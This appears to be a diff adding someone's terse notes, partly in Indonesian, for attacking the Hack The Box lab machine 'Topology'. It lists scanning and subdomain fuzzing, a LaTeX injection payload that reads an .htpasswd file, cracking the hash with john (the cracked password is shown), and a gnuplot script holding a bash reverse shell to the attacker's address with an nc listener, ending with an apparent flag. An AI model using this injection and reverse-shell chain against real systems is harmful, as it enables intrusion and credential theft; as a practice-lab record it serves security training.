@@ -1,0 +1,50 @@
+jalankan vpn htb
+
+
+ nmap -v -A 10.10.11.217
+
+
+sudo nano /etc/hosts
+
+127.0.0.1	localhost
+127.0.1.1	kali
+10.10.11.217 	latex.topology.htb dev.topology.htb stats.topology.htb topology.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+---------------------
+# mencari sub domain
+ffuf -u http://topology.htb/ -H "Host: FUZZ.topology.htb" -w /home/hadi/htb/wordlist/subdomains-top1million-5000.txt -fs 6767
+
+#latex injection
+$\lstinputlisting{/var/www/dev/.htpasswd}$
+
+ hash-identifier
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
+john pass.txt --show
+
+calculus20
+
+jalankan script python 
+./pspy32
+
+
+vim /opt/gnuplot/yw-exploit.plt
+system "bash -c 'bash -i >& /dev/tcp/10.10.14.59/9001 0>&1'"
+
+
+nc -nvlp 9001
+
+
+
+10.10.14.59 --> alamat vpn kita
+
+
+ac0e63f0b60510cb2cd8628553fcab19
+
+
